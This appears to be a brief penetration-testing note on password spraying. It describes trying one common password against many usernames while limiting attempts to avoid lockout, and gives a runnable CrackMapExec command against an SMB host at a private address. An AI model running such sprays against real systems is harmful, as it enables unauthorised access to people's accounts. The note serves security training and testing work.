## Attack: Try one common password against multiple user accounts.
### How it Works:

- Create list of usernames (jdoe, asmith, administrator)
- Use single password ("Winter2024!") across all accounts
- Avoid lockout by limiting attempts per account

### Tool: CrackMapExec
```bash
crackmapexec smb 192.168.57.101 -u users.txt -p 'Winter2024!' --continue-on-success
```
**Goal**: Find accounts with weak passwords, gain initial access
